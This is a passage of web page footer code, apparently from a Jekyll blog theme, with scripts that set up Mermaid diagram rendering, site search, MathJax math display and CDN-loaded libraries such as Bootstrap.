{ let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
